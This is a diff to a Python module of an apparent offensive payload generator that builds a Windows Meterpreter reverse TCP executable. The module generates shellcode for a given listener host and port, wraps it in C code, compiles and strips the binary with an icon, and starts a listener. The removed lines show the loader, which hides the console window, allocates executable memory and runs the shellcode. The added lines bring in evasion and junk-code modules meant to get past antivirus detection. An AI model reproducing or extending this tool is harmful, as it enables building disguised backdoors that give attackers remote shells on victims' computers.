@@ -1,4 +1,4 @@
-from lib import core, gen
+from lib import evasion, core, gen, junkcode
 
 
 
@@ -11,7 +11,7 @@ def Construction():
     
     RC_PAYLOAD = "windows/meterpreter/reverse_tcp"
     
-    print(core.amcolors.PURPLE + core.amcolors.BOLD + "Payload x86 Meterpreter Reverse TCP" + core.amcolors.ENDC)
+    print(core.amcolors.PURPLE + core.amcolors.BOLD + " Payload x86 Meterpreter Reverse TCP" + core.amcolors.ENDC)
 
     Gen_Payload = True
 
@@ -21,32 +21,27 @@ def Construction():
         LPORT = gen.LPORT_Input()
         FILENAME = "/root/AccessMe/output/" + gen.FILENAME_Input() + ".exe"
 
+        print(core.amcolors.OCRA + core.amcolors.BOLD + " [*] Code generation." + core.amcolors.ENDC)
+
         PAYLOAD = gen.Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT)
 
-        core.Clear()
+        Final_Code = junkcode.Start()
 
-        print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Code generation." + core.amcolors.ENDC)
-
-        Final_Code = "#include <windows.h>\n"
-        Final_Code += "#include <stdio.h>\n"
-        Final_Code += "#include <stdlib.h>\n"
-        Final_Code += "int main(int argc, char **argv) {\n"
         Final_Code += "char shellcode[] = {\n"
         Final_Code += str(PAYLOAD)
-        Final_Code += "};HWND hWnd = GetConsoleWindow();ShowWindow(hWnd, SW_HIDE);void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);memcpy(exec, shellcode, sizeof shellcode);((void(*)())exec)();}"
+
+        Final_Code += junkcode.End()
 
         with open('source.c', 'w') as f:
             f.write(Final_Code)
 
-        print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Code generated." + core.amcolors.ENDC)
-
         ICON = gen.Add_Icon()
 
-        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n[*] Compiling." + core.amcolors.ENDC)
+        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n [*] Compiling." + core.amcolors.ENDC)
 
         gen.Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON)
 
-        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n[*] Stripping executable." + core.amcolors.ENDC)
+        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n [*] Stripping executable." + core.amcolors.ENDC)
 
         gen.Auto_Executable_Strip(FILENAME, PLATFORM)
 
@@ -54,7 +49,7 @@ def Construction():
 
         gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT)
 
-        print(core.amcolors.GREEN + core.amcolors.BOLD + "\n[+] Complete task." + core.amcolors.ENDC)
-        print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Exiting script." + core.amcolors.ENDC)
+        print(core.amcolors.GREEN + core.amcolors.BOLD + "\n [+] Complete task." + core.amcolors.ENDC)
+        print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Exiting script." + core.amcolors.ENDC)
 
         Gen_Payload = False
